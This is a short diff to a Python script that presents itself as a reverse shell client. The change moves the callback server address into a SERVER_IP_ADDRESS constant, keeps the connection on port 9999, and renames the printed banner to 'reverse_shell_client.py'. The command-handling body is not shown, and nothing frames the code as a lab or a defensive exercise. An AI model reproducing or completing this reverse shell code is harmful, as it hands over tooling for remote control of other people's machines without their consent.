@@ -2,13 +2,15 @@ import socket
 import os
 import subprocess
 
+SERVER_IP_ADDRESS = ' ' # TODO: Ff dynamic IP, need to update this from time to time
+
 # create a Socket
 def create_socket():
     global host
     global port 
     global s 
 
-    host = '' # Server address note: if dynamic IP, need to update this
+    host = SERVER_IP_ADDRESS
     port = 9999 # port that are not being used a lot
     try:
         s = socket.socket()
@@ -50,7 +52,7 @@ def service_socket():
 
 
 if __name__ == "__main__":
-    print('\n=======\nclient.py\n=======\n')
+    print('\n=======\nreverse_shell_client.py\n=======\n')
 
     create_socket()
     connect_socket()
